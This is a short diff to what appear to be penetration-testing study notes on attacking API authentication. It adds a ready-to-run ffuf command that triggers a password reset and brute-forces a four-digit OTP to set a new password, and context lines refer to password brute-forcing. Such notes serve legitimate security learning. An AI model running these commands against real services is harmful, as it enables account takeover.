@@ -27,3 +27,12 @@ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:P
 ```
 ### Brute-forcing OTPs and Answers of Security Questions
 If brute-forcing passwords is infeasible due to strong password policies, we can attempt to brute-force OTPs or answers to security questions to reset passwords.
+Send a password reset and then fuzz the OTP:
+```
+ffuf -u http://$ip:$port/api/v1/authentication/customers/passwords/resets \
+-X POST \
+-H "accept: application/json" \
+-H "Content-Type: application/json" \
+-d '{"Email":"$email","OTP":"FUZZ","NewPassword":"123456"}' \
+-w /opt/useful/seclists/Fuzzing/4-digits-0000-9999.txt
+```
